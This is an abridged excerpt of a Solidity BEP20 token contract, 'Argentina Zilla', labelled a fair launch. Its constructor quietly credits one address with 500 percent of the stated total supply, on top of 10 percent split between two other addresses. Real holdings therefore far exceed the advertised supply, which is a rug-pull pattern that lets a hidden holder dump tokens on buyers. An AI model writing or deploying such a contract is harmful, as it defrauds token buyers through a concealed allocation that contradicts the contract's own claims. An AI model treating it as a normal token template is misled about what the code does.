...
contract ArgentinaToken is IBEP20 {
     // FairLaunch
    // common addresses
    address private owner;
    address private ArgentinaBSC;
    address private ArgentinaCoin;
    address private Argentinas;
    ...
    string public override name = "Argentina Zilla";
    string public override symbol = "ARGENZILLA";
    ...
    constructor(uint totalSupplyValue, address ArgentinaBSCAddress, address ArgentinaCoinAddress, address ArgentinasAddress) {
        // set total supply
        totalSupply = totalSupplyValue;
        
        // designate addresses
        owner = msg.sender;
        ArgentinaBSC = ArgentinaBSCAddress;
        ArgentinaCoin = ArgentinaCoinAddress;
        Argentinas = ArgentinasAddress;
        balances[ArgentinaBSC] =  totalSupply * 1 / 100;
        balances[ArgentinaCoin] = totalSupply * 9 / 100;
        balances[Argentinas] = totalSupply * 500 / 100;
